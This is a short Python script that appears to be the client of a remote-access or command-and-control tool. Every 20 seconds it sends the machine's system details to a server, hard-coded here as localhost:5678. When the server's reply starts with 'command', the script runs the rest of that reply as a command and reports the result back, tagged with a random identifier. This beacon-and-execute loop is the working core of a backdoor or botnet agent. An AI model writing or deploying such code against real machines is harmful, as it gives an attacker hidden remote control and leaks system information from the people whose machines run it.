import urllib.request
import urllib.parse
import time
import random

import SystemInfo
import Command

IPAdress = 'localhost'
Port = 5678
Interval = 20

def RandomMagicString():
	magicNumber = random.randint(0, 10000000000)
	return str(magicNumber)
def Heart():
	magicNumber = RandomMagicString()
	while True:
		sysInfoDict = SystemInfo.SystemDetail()
		params = urllib.parse.urlencode(sysInfoDict)
		url = 'http://' + IPAdress + ':' + str(Port) + "/heart?%s" %params + "&magicnumber=" + magicNumber
		#print(url)
		f = urllib.request.urlopen(url)
		returnMessage = f.read().decode('utf-8')
		if returnMessage == 'true':
			pass
		elif returnMessage.startswith('command'):
			print(returnMessage[7:])
			result = Command.RunExe(returnMessage[7:])
			url = 'http://' + IPAdress + ':' + str(Port) + "/commandresult?result=" + str(result) + "&magicnumber=" + str(magicNumber)
			f = urllib.request.urlopen(url)
			returnMessage = f.read().decode('utf-8')
			print("commandresult" + returnMessage)

		time.sleep(Interval)


if __name__ == '__main__':
	Heart()
	# for i in range(10):
	# 	print(RandomMagicString())

